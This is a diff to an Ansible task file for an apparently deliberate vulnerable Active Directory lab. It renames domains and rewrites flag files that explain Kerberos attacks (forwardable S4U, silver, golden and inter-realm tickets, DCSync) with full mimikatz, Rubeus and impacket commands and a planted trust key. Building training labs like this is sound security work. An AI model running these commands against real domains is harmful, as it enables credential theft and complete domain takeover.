@@ -1,7 +1,7 @@
 ---
 # ==============================================================================
 # vuln_cred_extended/tasks/kerberos_ext.yml — CRED-091..120
-# Target: dc01.corp.local
+# Target: coruscant.empire.local
 #
 # CRED-091  Kerberoasting via AS-REQ (Kerberoasting without auth)
 # CRED-092  Targeted Kerberoasting via WriteSPN (already in LAT-025)
@@ -40,11 +40,11 @@
         Allows impersonating a Protected Users member (normally blocked) via delegation.
 
         Prereq: Control a service account with constrained delegation
-        (dc01 has SMTP constrained delegation — DF-020)
+        (coruscant has SMTP constrained delegation — DF-020)
 
         Tool: Impacket getST with -force-forwardable flag
-          impacket-getST -spn SMTP/dc01.corp.local -impersonate Administrator \
-            -force-forwardable corp.local/dc01$ -hashes :$(secretsdump hash)
+          impacket-getST -spn SMTP/coruscant.empire.local -impersonate Administrator \
+            -force-forwardable empire.local/coruscant$ -hashes :$(secretsdump hash)
 
     - path: 'C:\Flags\FLAG-CRED-096-SilverTicket.txt'
       content: |
@@ -54,15 +54,15 @@
         No KDC interaction required — entirely offline.
 
         Targets:
-          - svc_web NTLM hash → forge HTTP/web01.corp.local TGS → impersonate admin
-          - svc_sql NTLM hash → forge MSSQLSvc/sql01 TGS → SA access
+          - svc_c3po NTLM hash → forge HTTP/web01.empire.local TGS → impersonate admin
+          - svc_sql NTLM hash → forge MSSQLSvc/kamino TGS → SA access
 
         Tool:
-          mimikatz# kerberos::golden /user:Administrator /domain:corp.local \
-            /sid:S-1-5-21-... /target:sql01.corp.local /service:MSSQLSvc \
+          mimikatz# kerberos::golden /user:Administrator /domain:empire.local \
+            /sid:S-1-5-21-... /target:kamino.empire.local /service:MSSQLSvc \
             /rc4:<svc_sql_ntlm> /ptt
 
-          Rubeus silver /service:MSSQLSvc/sql01.corp.local /rc4:<hash> \
+          Rubeus silver /service:MSSQLSvc/kamino.empire.local /rc4:<hash> \
             /user:Administrator /ldap /nowrap
 
     - path: 'C:\Flags\FLAG-CRED-099-GoldenTicket.txt'
@@ -76,31 +76,31 @@
         Reset via vuln_persistence role (allows hash extraction + TGT forge)
 
         Tool:
-          mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
-          mimikatz# kerberos::golden /user:Administrator /domain:corp.local \
+          mimikatz# lsadump::dcsync /domain:empire.local /user:krbtgt
+          mimikatz# kerberos::golden /user:Administrator /domain:empire.local \
             /sid:S-1-5-21-... /krbtgt:<hash> /ptt
 
-          Rubeus golden /rc4:<krbtgt_hash> /domain:corp.local \
+          Rubeus golden /rc4:<krbtgt_hash> /domain:empire.local \
             /sid:S-1-5-21-... /user:Administrator /ptt
 
-        Post-golden: access any service in corp.local as Administrator
+        Post-golden: access any service in empire.local as Administrator
 
     - path: 'C:\Flags\FLAG-CRED-100-InterRealm.txt'
       content: |
         CRED-100: Inter-Realm Ticket Abuse
         =====================================
-        With cross-forest trusts (corp.local ←→ finance.local ←→ root.corp),
-        a Golden Ticket in corp.local can be used to obtain inter-realm TGTs.
+        With cross-forest trusts (empire.local ←→ rebel.local ←→ trade.corp),
+        a Golden Ticket in empire.local can be used to obtain inter-realm TGTs.
 
         Trust key in this lab: TrustKey2024!
         SID filtering: DISABLED on all trusts (vuln_forest role)
 
         Attack:
-          1. Golden Ticket in corp.local → present to finance.local KDC
+          1. Golden Ticket in empire.local → present to rebel.local KDC
           2. Finance DC issues inter-realm TGT (SID filtering off → corp DA SID accepted)
-          3. Access finance.local resources as Enterprise Admin
+          3. Access rebel.local resources as Enterprise Admin
 
-          mimikatz# kerberos::golden /user:Administrator /domain:corp.local \
-            /sid:S-1-5-21-CORP /sids:S-1-5-21-FINANCE-519 /krbtgt:<hash> /ptt
+          mimikatz# kerberos::golden /user:Administrator /domain:empire.local \
+            /sid:S-1-5-21-EMPIRE /sids:S-1-5-21-REBEL-519 /krbtgt:<hash> /ptt
 
-          # S-1-5-21-FINANCE-519 = finance.local Enterprise Admins SID
+          # S-1-5-21-REBEL-519 = rebel.local Enterprise Admins SID
